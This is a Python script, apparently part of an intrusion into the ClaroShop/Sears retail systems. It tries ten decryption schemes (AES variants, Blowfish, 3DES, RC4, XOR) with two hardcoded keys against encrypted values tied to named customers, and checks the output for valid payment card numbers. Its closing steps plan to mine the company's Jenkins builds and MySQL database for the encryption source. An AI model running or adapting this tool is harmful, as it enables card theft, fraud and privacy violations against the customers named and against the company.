"""
ClaroShop/Sears TDC Decryption — comprehensive local + Jenkins approach
"""
import base64, hashlib, sys, struct
from binascii import hexlify
from itertools import cycle

# Try importing crypto libs
try:
    from Crypto.Cipher import AES, Blowfish, DES3, DES, ARC4
    HAS_CRYPTO = True
except ImportError:
    try:
        from Cryptodome.Cipher import AES, Blowfish, DES3, DES, ARC4
        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False
        print("WARNING: No pycryptodome found. Install with: pip install pycryptodome")

samples = [
    ("L7nSVdHR0dF/VLlW9yCgBC9SZOQ=", "David Asenjo Reyes"),
    ("eLPSVaOjo6NkY4jy+Nafepcz2JgypSA=", "ALEJANDRA MAYA PARRILLA"),
    ("T6rSVVZWVlaw9G6mohmb5q9E3Hk=", "alejandro cruz"),
    ("163SVdra2tq4DF0DBUPMIw+8Wns=", "MISAEL ESLI ALMAZAN NEVAREZ"),
]

KEY1 = b'K0SUH7I1yDR616H8LrP0XuhURcCN5uRY4'  # 35 bytes
KEY2 = b'cZoiHP0hBKeiLTvvlT3IcRvtf6f9Gyh5'   # 32 bytes

def mysql_aes_key(key_str):
    """MySQL AES_ENCRYPT key derivation (XOR folding to 16 bytes)"""
    key = bytearray(16)
    for i, c in enumerate(key_str):
        key[i % 16] ^= c
    return bytes(key)

def is_card_number(data):
    """Check if decrypted data looks like a card number"""
    # Strip null padding
    stripped = data.rstrip(b'\x00').rstrip(b'\x20')
    try:
        text = stripped.decode('ascii', errors='ignore')
    except:
        return False, ""
    digits = ''.join(c for c in text if c.isdigit())
    if len(digits) >= 13 and len(digits) <= 19:
        if digits[0] in '3456':  # Valid card prefixes
            return True, digits
    return False, text

def luhn_check(number):
    """Luhn algorithm for card validation"""
    digits = [int(d) for d in number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10 == 0

print("=" * 70)
print("BINARY STRUCTURE ANALYSIS")
print("=" * 70)

decoded_samples = []
for b64val, name in samples:
    raw = base64.b64decode(b64val)
    decoded_samples.append((raw, name, b64val))
    print(f"\n{name}: {len(raw)} bytes")
    print(f"  Full hex: {hexlify(raw).decode()}")
    print(f"  [0:4] header: {hexlify(raw[0:4]).decode()}")
    print(f"  [4:8] repeat: {hexlify(raw[4:8]).decode()} (byte=0x{raw[4]:02x})")
    print(f"  [8:]  cipher: {hexlify(raw[8:]).decode()} ({len(raw)-8} bytes)")

if not HAS_CRYPTO:
    print("\n\nCannot proceed without pycryptodome. Install and rerun.")
    sys.exit(1)

# ============================================================
# APPROACH 1: MySQL AES_ENCRYPT style (XOR-folded key, AES-128-ECB)
# Cipher data = bytes[4:20] (16 bytes) for 20-byte samples
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 1: MySQL AES_ENCRYPT — AES-128-ECB with XOR-folded key")
print("=" * 70)

for key_name, key_raw in [("KEY1", KEY1), ("KEY2", KEY2)]:
    aes_key = mysql_aes_key(key_raw)
    print(f"\n  {key_name} folded to AES key: {hexlify(aes_key).decode()}")
    cipher = AES.new(aes_key, AES.MODE_ECB)
    
    for raw, name, _ in decoded_samples:
        if len(raw) < 20:
            continue
        # Try cipher = bytes[4:20]
        ct = raw[4:20]
        try:
            pt = cipher.decrypt(ct)
            ok, card = is_card_number(pt)
            if ok:
                print(f"  *** MATCH [{key_name}] {name}: {card} (Luhn: {luhn_check(card)})")
            else:
                print(f"  [{key_name}] {name} bytes[4:20]: {pt[:20]} (not card)")
        except:
            pass
        
        # Try cipher = full bytes (first 16)
        if len(raw) >= 16:
            ct2 = raw[0:16]
            try:
                pt2 = cipher.decrypt(ct2)
                ok2, card2 = is_card_number(pt2)
                if ok2:
                    print(f"  *** MATCH [{key_name}] {name} bytes[0:16]: {card2} (Luhn: {luhn_check(card2)})")
            except:
                pass

# ============================================================
# APPROACH 2: AES-128-ECB with raw key (first 16 bytes) / MD5 / SHA1
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 2: AES-128-ECB with various key derivations")
print("=" * 70)

key_derivations = {
    "KEY1[:16]": KEY1[:16],
    "KEY1[:32]": KEY1[:32],  # will use as AES-256
    "KEY2[:16]": KEY2[:16],
    "KEY2": KEY2,  # 32 bytes = AES-256
    "MD5(KEY1)": hashlib.md5(KEY1).digest(),
    "MD5(KEY2)": hashlib.md5(KEY2).digest(),
    "SHA1(KEY1)[:16]": hashlib.sha1(KEY1).digest()[:16],
    "SHA1(KEY2)[:16]": hashlib.sha1(KEY2).digest()[:16],
    "SHA256(KEY1)[:16]": hashlib.sha256(KEY1).digest()[:16],
    "SHA256(KEY2)[:16]": hashlib.sha256(KEY2).digest()[:16],
    "SHA256(KEY1)[:32]": hashlib.sha256(KEY1).digest()[:32],
    "SHA256(KEY2)[:32]": hashlib.sha256(KEY2).digest()[:32],
}

for kname, kval in key_derivations.items():
    key_size = len(kval)
    if key_size == 16:
        mode_name = "AES-128-ECB"
    elif key_size == 24:
        mode_name = "AES-192-ECB"
    elif key_size == 32:
        mode_name = "AES-256-ECB"
    else:
        continue
    
    try:
        cipher = AES.new(kval, AES.MODE_ECB)
    except:
        continue
    
    for raw, name, _ in decoded_samples:
        # Try bytes[4:20] as ciphertext
        if len(raw) >= 20:
            ct = raw[4:20]
            pt = cipher.decrypt(ct)
            ok, card = is_card_number(pt)
            if ok:
                print(f"  *** HIT! {kname} | {name}: {card} (Luhn: {luhn_check(card)})")
        
        # Try bytes[0:16] as ciphertext
        if len(raw) >= 16:
            ct = raw[0:16]
            pt = cipher.decrypt(ct)
            ok, card = is_card_number(pt)
            if ok:
                print(f"  *** HIT! {kname} bytes[0:16] | {name}: {card} (Luhn: {luhn_check(card)})")

# ============================================================
# APPROACH 3: AES-CBC with IV = first 4 bytes padded to 16
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 3: AES-128-CBC with IV from header bytes")
print("=" * 70)

for key_name, key_raw in [("KEY1", KEY1), ("KEY2", KEY2)]:
    for kd_name, kval in [("mysql_fold", mysql_aes_key(key_raw)), 
                           ("raw[:16]", key_raw[:16]),
                           ("md5", hashlib.md5(key_raw).digest())]:
        if len(kval) not in (16, 24, 32):
            continue
        
        for raw, name, _ in decoded_samples:
            if len(raw) < 20:
                continue
            
            # IV = first 4 bytes zero-padded to 16
            iv1 = raw[0:4] + b'\x00' * 12
            # IV = bytes 4-7 (repeated) padded to 16
            iv2 = raw[4:8] + b'\x00' * 12
            # IV = all zeros
            iv3 = b'\x00' * 16
            
            for iv_name, iv in [("hdr[0:4]+zeros", iv1), ("rep[4:8]+zeros", iv2), ("zeros", iv3)]:
                # Ciphertext = bytes after header (varies)
                for ct_start in [4, 8]:
                    ct = raw[ct_start:]
                    if len(ct) < 16:
                        ct = ct + b'\x00' * (16 - len(ct))
                    ct = ct[:16]  # take one block
                    
                    try:
                        c = AES.new(kval, AES.MODE_CBC, iv=iv)
                        pt = c.decrypt(ct)
                        ok, card = is_card_number(pt)
                        if ok:
                            print(f"  *** HIT! {key_name}/{kd_name} IV={iv_name} ct[{ct_start}:] | {name}: {card}")
                    except:
                        pass

# ============================================================
# APPROACH 4: Blowfish ECB/CBC (8-byte blocks)
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 4: Blowfish ECB with various keys")
print("=" * 70)

for key_name, key_raw in [("KEY1", KEY1), ("KEY2", KEY2), 
                           ("KEY1[:16]", KEY1[:16]), ("KEY2[:16]", KEY2[:16])]:
    try:
        bf = Blowfish.new(key_raw, Blowfish.MODE_ECB)
    except:
        continue
    
    for raw, name, _ in decoded_samples:
        # Try different ciphertext offsets
        for start in [0, 4, 8]:
            ct = raw[start:]
            # Blowfish needs multiple of 8
            usable = (len(ct) // 8) * 8
            if usable < 8:
                continue
            ct = ct[:usable]
            pt = bf.decrypt(ct)
            ok, card = is_card_number(pt)
            if ok:
                print(f"  *** HIT! {key_name} Blowfish start={start} | {name}: {card}")

# ============================================================
# APPROACH 5: 3DES ECB
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 5: 3DES ECB")
print("=" * 70)

for key_name, key_raw in [("KEY1[:24]", KEY1[:24]), ("KEY2[:24]", KEY2[:24]),
                           ("KEY1[:16]", KEY1[:16]), ("KEY2[:16]", KEY2[:16])]:
    try:
        des3 = DES3.new(key_raw, DES3.MODE_ECB)
    except Exception as e:
        continue
    
    for raw, name, _ in decoded_samples:
        for start in [0, 4, 8]:
            ct = raw[start:]
            usable = (len(ct) // 8) * 8
            if usable < 8:
                continue
            ct = ct[:usable]
            try:
                pt = des3.decrypt(ct)
                ok, card = is_card_number(pt)
                if ok:
                    print(f"  *** HIT! {key_name} 3DES start={start} | {name}: {card}")
            except:
                pass

# ============================================================
# APPROACH 6: RC4 stream cipher
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 6: RC4 stream cipher")
print("=" * 70)

for key_name, key_raw in [("KEY1", KEY1), ("KEY2", KEY2),
                           ("MD5(KEY1)", hashlib.md5(KEY1).digest()),
                           ("MD5(KEY2)", hashlib.md5(KEY2).digest())]:
    for raw, name, _ in decoded_samples:
        for start in [0, 4, 8]:
            ct = raw[start:]
            try:
                rc4 = ARC4.new(key_raw)
                pt = rc4.decrypt(ct)
                ok, card = is_card_number(pt)
                if ok:
                    print(f"  *** HIT! RC4 {key_name} start={start} | {name}: {card}")
            except:
                pass

# ============================================================
# APPROACH 7: Simple XOR with full key (rotating)
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 7: Rotating XOR with key")
print("=" * 70)

def xor_decrypt(data, key, key_offset=0):
    result = bytearray()
    for i, b in enumerate(data):
        result.append(b ^ key[(i + key_offset) % len(key)])
    return bytes(result)

for key_name, key_raw in [("KEY1", KEY1), ("KEY2", KEY2)]:
    for raw, name, _ in decoded_samples:
        for start in [0, 4, 8]:
            for key_off in range(len(key_raw)):
                ct = raw[start:]
                pt = xor_decrypt(ct, key_raw, key_off)
                ok, card = is_card_number(pt)
                if ok:
                    print(f"  *** HIT! XOR {key_name} start={start} koff={key_off} | {name}: {card} (Luhn: {luhn_check(card)})")

# ============================================================
# APPROACH 8: XOR with MD5/SHA of key
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 8: XOR with hash of key")
print("=" * 70)

hash_keys = {
    "MD5(KEY1)": hashlib.md5(KEY1).digest(),
    "MD5(KEY2)": hashlib.md5(KEY2).digest(),
    "SHA1(KEY1)": hashlib.sha1(KEY1).digest(),
    "SHA1(KEY2)": hashlib.sha1(KEY2).digest(),
    "SHA256(KEY1)": hashlib.sha256(KEY1).digest(),
    "SHA256(KEY2)": hashlib.sha256(KEY2).digest(),
}

for hname, hkey in hash_keys.items():
    for raw, name, _ in decoded_samples:
        for start in [0, 4, 8]:
            ct = raw[start:]
            pt = xor_decrypt(ct, hkey, 0)
            ok, card = is_card_number(pt)
            if ok:
                print(f"  *** HIT! XOR {hname} start={start} | {name}: {card} (Luhn: {luhn_check(card)})")

# ============================================================  
# APPROACH 9: Custom — byte[4] as single XOR key for all data
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 9: Single-byte XOR (repeated byte as key)")
print("=" * 70)

for raw, name, _ in decoded_samples:
    rep_byte = raw[4]
    # XOR everything after pos 8 with the repeated byte
    pt = bytes(b ^ rep_byte for b in raw[8:])
    ok, card = is_card_number(pt)
    if ok:
        print(f"  *** HIT! {name}: {card}")
    # XOR from pos 4
    pt2 = bytes(b ^ rep_byte for b in raw[4:])
    ok2, card2 = is_card_number(pt2)
    if ok2:
        print(f"  *** HIT! from pos4 {name}: {card2}")
    # XOR entire thing
    pt3 = bytes(b ^ rep_byte for b in raw)
    ok3, card3 = is_card_number(pt3)
    if ok3:
        print(f"  *** HIT! full {name}: {card3}")

# ============================================================
# APPROACH 10: PHP mcrypt_encrypt MCRYPT_RIJNDAEL_128 — zero-padded input
# Try decrypting bytes[4:20] as ONE AES block where plaintext was zero-padded
# ============================================================
print("\n\n" + "=" * 70)
print("APPROACH 10: mcrypt Rijndael-128 ECB (PHP style, zero-pad)")
print("=" * 70)
print("(This is same as approach 1/2 but emphasizing the header is NOT cipher)")

# The 4 header bytes might encode the original plaintext length or a checksum
# After removing header, we have exactly 16 bytes = 1 AES block

for key_name, key_raw in [("KEY1", KEY1), ("KEY2", KEY2)]:
    # PHP mcrypt pads key with zeros to valid length (16, 24, or 32)
    # For 35-byte key: rounds up to... mcrypt actually uses the key AS-IS up to max
    # MCRYPT_RIJNDAEL_128 supports key sizes 16, 24, 32
    # PHP truncates or pads the key
    for klen in [16, 24, 32]:
        kval = (key_raw + b'\x00' * klen)[:klen]
        try:
            c = AES.new(kval, AES.MODE_ECB)
        except:
            continue
        for raw, name, _ in decoded_samples:
            if len(raw) >= 20:
                # Header = [0:4], ciphertext = [4:20]
                ct = raw[4:20]
                pt = c.decrypt(ct)
                ok, card = is_card_number(pt)
                if ok:
                    print(f"  *** HIT! {key_name} padded to {klen} | {name}: {card} (Luhn: {luhn_check(card)})")
                # Also try if header is part of the cipher (bytes 0-15)
                ct2 = raw[0:16]
                pt2 = c.decrypt(ct2)
                ok2, card2 = is_card_number(pt2)
                if ok2:
                    print(f"  *** HIT! {key_name} padded {klen} [0:16] | {name}: {card2}")

print("\n\n" + "=" * 70)
print("SUMMARY: If no hits above, need to find actual PHP source code")
print("=" * 70)
print("Next steps:")
print("  1. Search Jenkins builds for PHP source with encryption logic")
print("  2. Try openssl dec on Jenkins directly")
print("  3. Query MySQL for stored procedures / functions")
